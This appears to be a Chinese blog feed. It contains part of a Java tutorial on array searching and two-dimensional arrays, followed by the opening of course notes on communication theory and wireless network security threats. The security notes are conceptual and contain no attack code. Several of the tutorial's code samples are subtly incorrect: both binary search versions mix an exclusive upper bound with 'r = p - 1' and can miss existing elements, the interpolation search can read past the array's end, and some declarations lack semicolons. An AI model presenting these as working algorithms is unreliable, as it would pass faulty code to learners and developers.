class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-comment">//编写一个 main 方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        有一个数列：白眉鹰王、金毛狮王、紫衫龙王、青翼蝠王猜数游戏：</span><br><span class="hljs-comment">        从键盘中任意输入一个名称，判断数列中是否包含此名称【顺序查找】</span><br><span class="hljs-comment">        要求: 如果找到了，就提示找到，并给出下标值</span><br><span class="hljs-comment">        思路分析</span><br><span class="hljs-comment">        1. 定义一个字符串数组</span><br><span class="hljs-comment">        2. 接收用户输入, 遍历数组，逐一比较，如果有，则提示信息，并退出</span><br><span class="hljs-comment">        */</span><br>        <br>        <span class="hljs-comment">//定义一个字符串数组</span><br>        String[] names = &#123;<span class="hljs-string">&quot;白眉鹰王&quot;</span>, <span class="hljs-string">&quot;金毛狮王&quot;</span>, <span class="hljs-string">&quot;紫衫龙王&quot;</span>, <span class="hljs-string">&quot;青翼蝠王&quot;</span>&#125;;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;请输入名字&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">findName</span> <span class="hljs-operator">=</span> myScanner.next();<br>        <span class="hljs-comment">//遍历数组，逐一比较，如果有，则提示信息，并退出</span><br>        <span class="hljs-comment">//这里老师给大家一个编程思想/技巧, 一个经典的方法</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; names.length; i++) &#123;<br>        <span class="hljs-comment">//比较 字符串比较 equals, 如果要找到名字就是当前元素</span><br>            <span class="hljs-keyword">if</span>(findName.equals(names[i])) &#123;<br>                System.out.println(<span class="hljs-string">&quot;恭喜你找到 &quot;</span> + findName);<br>                System.out.println(<span class="hljs-string">&quot;下标为= &quot;</span> + i);<br>        <span class="hljs-comment">//把 i 保存到 index</span><br>                index = i;<br>                <span class="hljs-keyword">break</span>;<span class="hljs-comment">//退出</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(index == -<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">//没有找到</span><br>            System.out.println(<span class="hljs-string">&quot;sorry ,没有找到 &quot;</span> + findName);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二分查找">*5.3.2 二分查找</h3><p>二分查找要求数组必须是有序数组。</p><p>递归方式二分查找：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">binarySearch</span><span class="hljs-params">(<span class="hljs-type">int</span>[] array, <span class="hljs-type">int</span> target)</span> &#123;<br>    <span class="hljs-keyword">return</span> binarySearch(array, target, <span class="hljs-number">0</span>, array.length);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">binarySearch</span><span class="hljs-params">(<span class="hljs-type">int</span>[] array, <span class="hljs-type">int</span> target, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> &#123;<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span> -l - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (l + r) / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (target == array[p]) <span class="hljs-keyword">return</span> p;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (target &gt; array[p]) &#123;<br>        <span class="hljs-keyword">return</span> binarySearch(array, target, p + <span class="hljs-number">1</span>, r);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> binarySearch(array, target, l, p - <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>非递归方式二分查找：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">binarySearch2</span><span class="hljs-params">(<span class="hljs-type">int</span>[] array, <span class="hljs-type">int</span> target)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">l</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> array.length;<br>    <span class="hljs-keyword">while</span> (r &gt; l) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (r + l) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (target == array[p]) <span class="hljs-keyword">return</span> p;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (target &gt; array[p]) l = p + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> r = p - <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -l - <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="插值查找">*5.3.3 插值查找</h3><p>插值查找类似于二分查找，但其不是取出中位数，而是从自适应的位置取出一个元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">insertSearch</span><span class="hljs-params">(<span class="hljs-type">int</span>[] array, <span class="hljs-type">int</span> target)</span> &#123;<br>    <span class="hljs-keyword">if</span> (target &gt; array[array.length - <span class="hljs-number">1</span>]) <span class="hljs-keyword">return</span> -array.length;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (target &lt; array[<span class="hljs-number">0</span>]) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">l</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> array.length;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (r &gt;= l) &#123;<br>        p = l + (target - array[l]) * (r - <span class="hljs-number">1</span> - l) / (array[r - <span class="hljs-number">1</span>] - array[l]);<br>        <span class="hljs-keyword">if</span> (target == array[p]) <span class="hljs-keyword">return</span> p;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (target &gt; array[p]) l = p + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> r = p - <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -p;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="斐波那契查找">*5.3.4 斐波那契查找</h3><p>斐波那契查找原理与前两种类似，仅仅改变了中间节点的位置。其中间节点不是中位或插值，而是位于黄金分割点附近。</p><h2 id="二维数组">5.4 二维数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        请用二维数组输出如下图形</span><br><span class="hljs-comment">        0 0 0 0 0 0</span><br><span class="hljs-comment">        0 0 1 0 0 0</span><br><span class="hljs-comment">        0 2 0 3 0 0</span><br><span class="hljs-comment">        0 0 0 0 0 0</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-comment">//什么是二维数组：</span><br>        <span class="hljs-comment">//1. 从定义形式上看 int[][]</span><br>        <span class="hljs-comment">//2. 可以这样理解，原来的一维数组的每个元素是一维数组, 就构成二维数组</span><br>        <span class="hljs-type">int</span>[][] arr = &#123;&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125; &#125;;<br>        <span class="hljs-comment">//关于二维数组的关键概念</span><br>        <span class="hljs-comment">//(1)</span><br>        System.out.println(<span class="hljs-string">&quot;二维数组的元素个数=&quot;</span> + arr.length);<br>        <span class="hljs-comment">//(2) 二维数组的每个元素是一维数组, 所以如果需要得到每个一维数组的值还需要再次遍历</span><br>        <span class="hljs-comment">//(3) 如果我们要访问第 (i+1)个一维数组的第 j+1 个值 arr[i][j];</span><br>        <span class="hljs-comment">// 举例 访问 3, =》 他是第 3 个一维数组的第 4 个值 arr[2][3]</span><br>        System.out.println(<span class="hljs-string">&quot;第 3 个一维数组的第 4 个值=&quot;</span> + arr[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]); <br><span class="hljs-comment">//3. 输出二维图形</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<span class="hljs-comment">//遍历二维数组的每个元素</span><br>        <span class="hljs-comment">//1. arr[i] 表示 二维数组的第 i+1 个元素 比如 arr[0]：二维数组的第一个元素</span><br>        <span class="hljs-comment">//2. arr[i].length 得到 对应的 每个一维数组的长度</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; arr[i].length; j++) &#123;<br>                System.out.print(arr[i][j] + <span class="hljs-string">&quot; &quot;</span>); <span class="hljs-comment">//输出了一维数组</span><br>            &#125;<br>            System.out.println();<span class="hljs-comment">//换行</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">int</span>[][] ints;<span class="hljs-comment">// 声明一个二维数组</span><br><span class="hljs-type">int</span>[] ints2[];<span class="hljs-comment">// 也能这样声明</span><br><span class="hljs-type">int</span> ints3[][];<span class="hljs-comment">// 这样也行</span><br><span class="hljs-type">int</span>[] x,y[];<span class="hljs-comment">// 声明了两个数组，一个是 int[] x 一个是 int[][] y</span><br><span class="hljs-comment">// 把 int[] 视作一个类型，就能很好地理解这个写法</span><br></code></pre></td></tr></table></figure><p>二维数组实际是由多个一维数组组成的，它的各个元素的长度可以相同，也可以不同。</p><p>数组是一个对象，所以二维数组的元素存放的是一维数组的地址。</p><h3 id="二维数组构造方法">二维数组构造方法</h3><ul><li><p>构造方法1：动态初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">int</span>[][] a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>][<span class="hljs-number">4</span>]<span class="hljs-comment">// 创建 有3个 包含4个元素的一维数组 的二维数组</span><br><span class="hljs-type">int</span> a[][] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>][<span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure></li><li><p>构造方法2：动态初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">double</span>[][] many_doubles;<span class="hljs-comment">// 先声明变量</span><br>many_doubles = <span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[<span class="hljs-number">3</span>][<span class="hljs-number">4</span>];<span class="hljs-comment">// 再开辟空间</span><br></code></pre></td></tr></table></figure></li><li><p>构造方法3：动态初始化-列数不确定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">int</span>[][] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>][];<span class="hljs-comment">//创建 二维数组，一个有 3 个一维数组，但是每个一维数组还没有开数据空间</span><br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<span class="hljs-comment">//遍历 arr 每个一维数组</span><br>    <span class="hljs-comment">//给每个一维数组开空间 new</span><br>    <span class="hljs-comment">//如果没有给一维数组 new ,那么 arr[i]就是 null</span><br>arr[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[i + <span class="hljs-number">1</span>];<br><span class="hljs-comment">//遍历一维数组，并给一维数组的每个元素赋值</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; arr[i].length; j++) &#123;<br>arr[i][j] = i + <span class="hljs-number">1</span>;<span class="hljs-comment">//赋值</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>构造方法4：静态初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">int</span>[][] m = &#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>&#125;, &#123;<span class="hljs-number">95</span>&#125;&#125;;<br></code></pre></td></tr></table></figure></li></ul><h3 id="二维数组使用方法">二维数组使用方法</h3><ul><li><code>arr.length</code>：该二维数组的长度</li><li><code>arr[0]</code>：该二维数组的第一个子数组</li><li><code>arr[0].length</code>：该二维数组的第一个子数组的长度</li><li><code>arr[1][0]</code>：该二维数组第二个子数组的第一个元素的值</li></ul><h2 id="一些题目">5.5 一些题目</h2><p>1.已知有个升序的数组，要求插入个元素，该数组顺序依然是升序,比如:[10，12，45，90]，添加23 后, 数组为 [10，12，23，45，90]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">12</span>, <span class="hljs-number">45</span>, <span class="hljs-number">90</span>&#125;;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">insertNum</span> <span class="hljs-operator">=</span> <span class="hljs-number">23</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br><br>        <span class="hljs-comment">//先定位到应该插入的位置</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++)&#123;<br>            <span class="hljs-keyword">if</span>(insertNum &lt; arr[i])&#123;<br>                index = i;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(index == -<span class="hljs-number">1</span>)&#123;<br>            index = arr.length;<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;应该插入的位置,arr[i]中的i为：&quot;</span> + index);<br><br><span class="hljs-comment">//然后扩容数组</span><br>        <span class="hljs-type">int</span>[] arrNew = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[arr.length + <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,j = <span class="hljs-number">0</span>; i &lt; arrNew.length; i++)&#123;   <span class="hljs-comment">//这里的j很巧妙</span><br>            <span class="hljs-keyword">if</span>(index != i)&#123;<br>                arrNew[i] = arr[j];<br>                j++;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                arrNew[index] = insertNum;<br>            &#125;<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;下面即为定位+扩容后的数组：&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arrNew.length; i++)&#123;<br>            System.out.print(arrNew[i] + <span class="hljs-string">&quot;\t&quot;</span> );<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通信原理与安全技术概述</title>
    <link href="/2023/11/17/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/"/>
    <url>/2023/11/17/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>大三上选的一门选修课——《通信原理与安全》的部分笔记</p></blockquote><h2 id="第一章-绪论">第一章 绪论</h2><h3 id="通信的基本概念">1.1 通信的基本概念</h3><p>通信（Communication）——沟通信息。</p><p>通信系统——发送器、信道、接收器。</p><p>信源（发信者）：把各种消息转换成原始电信号。该信号含有丰富的低频成分甚至直流分量，因此又称基带信号。</p><p>信道：信号传输的通道。</p><p>信宿（收信者）：将复原的原始电信号转换成相应的消息。</p><p>噪声源：噪声源不是人为加入的设备，而是通信系统中各种设备以及信道中所固有的，并且是人们所不希望的。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171411669.png"alt="image-20231117141146493" /><figcaption aria-hidden="true">image-20231117141146493</figcaption></figure><p><strong>知识</strong>是一种具有普遍和概括性质的高层次信息</p><p><strong>消息</strong>是信息的载体，而不是信息本身</p><p>消息变换成适合信道传输的物理量（电磁波、光），就是<strong>信号</strong>。</p><blockquote><p>1949年，香农在Bell System TechnicalJournal上发表了著名论文《通信的数学原理》（ A mathematical theory ofcommunication ）以及《噪声下的通信》（ Communication in the presence ofnoise），对信息作出定义，并阐明了通信的基本问题，给出了通信系统的模型，提出了信息量的数学表达式，并探讨了信道容量，信源编码，信道编码等一系列基本问题，是通信的奠基性著作。</p></blockquote><p><strong>香农对信息的定义</strong></p><p>香农给出定义：信息是对事物运动状态或存在方式的不确定性的描述</p><p>首先，香农注意到消息的信息量与消息本身的不确定性有关。例如，抛一枚硬币，如果正面出现的概率是99%，那么当我们得知抛掷的结果是反面时得到的信息量会比得知是正面时得到的信息量大。</p><p>其次，他发现<strong>通信的目的就是要消除不确定性</strong>。具体地讲，信息传递过程是一个从不知到知的过程（理想信道）或者是一个从知之甚少到知之甚多的过程（有噪信道）</p><h3 id="几个数学概念">1.2 几个数学概念</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171416779.png"alt="image-20231117141604674" /><figcaption aria-hidden="true">image-20231117141604674</figcaption></figure><p><strong>单个消息信息量的数学定义</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171417003.png"alt="image-20231117141746926" /><figcaption aria-hidden="true">image-20231117141746926</figcaption></figure><p>信息量的单位：</p><ul><li>a = 2，则为比特（bit），<strong>最常用</strong></li><li>a = e，则为奈特（nat）</li></ul><p>信息源信息量的数学定义：熵</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171429188.png"alt="image-20231117142925095" /><figcaption aria-hidden="true">image-20231117142925095</figcaption></figure><h3 id="现代通信的发展">1.3 现代通信的发展</h3><p>按照通信方式：</p><ul><li>原始通信：烽火、驿站、邮政</li><li>有线通信：计算机网络，有线电话，光纤通信</li><li>无线通信 (本课程的重点)：蜂窝网（移动通信）、WIFI、蓝牙等</li></ul><p>按照信号类型：</p><ul><li>模拟通信：系统传输模拟信号</li><li>数字通信：系统传输数字信号</li></ul><p>#### 无线通信的发展史</p><p>移动通信（蜂窝网）</p><ul><li>第一代（1G）：模拟通信（大哥大）</li><li>第二代（2G）：GSM（FDMA频分多址），数字通信的开始</li><li>第三代（3G）：CDMA2000（电信），WCDMA（联通），TD-SCDMA（移动，我国自主研发）</li><li>第四代（4G）：LTE （TD-LTE，FD-LTE），OFDM+MIMO</li><li>第五代（5G）：NR (NewRadio)，三大场景：增强的移动宽带，海量接入，超可靠低时延（eMBB, mMTC,URLLC）</li><li>第六代（6G）：正在理论探讨阶段</li></ul><p>局域网：WLAN (WiFi)</p><p>蓝牙、ZigBee</p><h4 id="无线通信系统的基本构成">无线通信系统的基本构成</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171445127.png"alt="image-20231117144535016" /><figcaption aria-hidden="true">image-20231117144535016</figcaption></figure><h4 id="无线通信系统的性能指标">无线通信系统的性能指标</h4><ul><li><p>有效性---速度指标</p></li><li><p>可靠性---质量指标，与有效性相矛盾</p></li><li><p>安全性</p></li></ul><h4 id="无线通信安全简史">无线通信安全简史</h4><p>移动通信方面</p><p>第一代：几乎没有安全措施，用户（手机）把自己的序列号发送至网络（例如基站），网络查一下有这个序列号就允许其连接，一旦手机序列号被克隆，别人就可以使用相应的网络服务</p><p>第二代（GSM）：</p><p>特点：</p><ul><li><p>采用基于私钥密码体制的安全机制</p></li><li><p>通过鉴权（认证）来防止非法用户使用网络</p></li><li><p>通过加密技术防止无线信道的窃听</p></li></ul><p>缺点：</p><ul><li>所使用的身份认证和加密算法存在许多安全隐患</li><li>安全密钥太短可能被短时间破译</li><li>SIM卡可能被克隆</li><li>没有考虑数据完整性保护，难以发现数据被篡改</li></ul><p>3G, 4G, 5G：</p><p>特点：</p><ul><li><p>重新设计安全算法</p></li><li><p>增加密钥长度</p></li><li><p>提供双向认证（用户与网络）</p></li><li><p>保证数据的完整性</p></li><li><p>安全体系趋于稳定</p></li></ul><p>挑战：超级计算机，密钥分发和管理</p><p>WLAN：非商用，不盈利，所以研究人员只关注速率、时延等性能，安全性考虑较少，目前常用的是RC4和AES算法</p><h4 id="无线通信网面临的主要安全威胁">无线通信网面临的主要安全威胁</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171500921.png"alt="image-20231117150033846" /><figcaption aria-hidden="true">image-20231117150033846</figcaption></figure><p>首先来明确几个概念</p><ul><li>无线终端：手机，pad，笔记本电脑等</li><li>无线接入点：小基站、路由器等</li><li>网络基础设施：大基站，交换机</li><li>空中接口：无线终端与无线接入点之间的接口</li></ul><p>移动通信系统面临的威胁可以分成三大类</p><ul><li>对传递信息的威胁：这类威胁针对系统中传输的个人信息（语音、短信等）</li><li>对用户的威胁：这类威胁针对用户的行为（用户在哪，在做什么等）</li><li>对通信系统的威胁破坏系统的完整，访问权限等</li></ul><p>对传递信息的威胁</p><ul><li><p>侦听</p><ul><li><p>可以理解为非法窃听</p></li><li><p>无线通信的广播特性使得任何具有天线的设备都能收到其他用户的数据</p></li></ul></li><li><p>篡改：非授权方更改系统中的各种信息，伪装成合法用户进行信息的修改</p></li><li><p>抵赖：通信一方否认自己的行为</p></li></ul><p>对用户的威胁</p><ul><li>流量分析：分析信息速率，消息长度，接收者或者发送者标识等</li><li>监视：了解用户在何时何地进行通信</li></ul><p>对通信系统的威胁</p><ul><li>拒绝服务<ul><li>非法攻击使系统无法提供服务</li><li>例如发送大量垃圾信息造成网络拥堵，阻止系统对正常用户的服务</li></ul></li><li>资源的非授权访问<ul><li>越权使用超过其职权范围的资源</li><li>例如学信网学生注册信息丢失</li><li>强行占用不属于自己的信道</li></ul></li></ul><h4 id="移动通信系统的安全要求">移动通信系统的安全要求</h4><p>1）能唯一地标识用户</p><p>2）冒充合法用户是困难的</p><p>3）双向认证。用户和服务器之间相互信任</p><p>4）机密性。保证传输数据的安全</p><p>5）用户身份的匿名性。不向第三方暴露自己的身份</p><p>6）不可否认性。防止抵赖</p><p>7）完整性</p><h3 id="专有名词缩略表">1.4 专有名词缩略表</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">GSM：<span class="hljs-keyword">Global</span> system <span class="hljs-keyword">for</span> mobile communications<br>W-CDMA: wideband-code division multiple access<br>TD-SCDMA: time division-synchronous code division multiple access<br><span class="hljs-symbol">LTE:</span> <span class="hljs-type">long</span> term evolusion<br><span class="hljs-symbol">NR:</span> <span class="hljs-built_in">new</span> radio<br><span class="hljs-symbol">eMBB:</span> Enhanced Mobile Broadband<br><span class="hljs-symbol">mMTC:</span> Massive Machine Type Communication<br><span class="hljs-symbol">URLLC:</span> Ultra Reliable Low Latency Communication<br></code></pre></td></tr></table></figure><h2 id="第二章-信源编码">第二章 信源编码</h2><h3 id="采样定理">2.1 